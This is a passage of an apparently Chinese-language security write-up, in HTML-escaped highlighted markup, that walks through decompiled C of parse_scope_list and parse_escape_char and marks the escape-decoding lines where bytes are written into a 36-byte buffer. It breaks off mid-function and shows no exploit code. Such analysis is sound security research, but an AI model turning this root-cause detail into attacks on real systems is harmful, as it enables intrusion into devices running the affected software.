    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;如上面程式碼所示，在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_scope_list&lt;/code&gt; 中，會先分配 36 bytes 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;destbuf&lt;/code&gt; 並且指定最大大小 34 到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt; 中，這邊沒甚麼問題，讓我們來看一下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r11&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;,&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\\&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[1]&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------------------[2]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
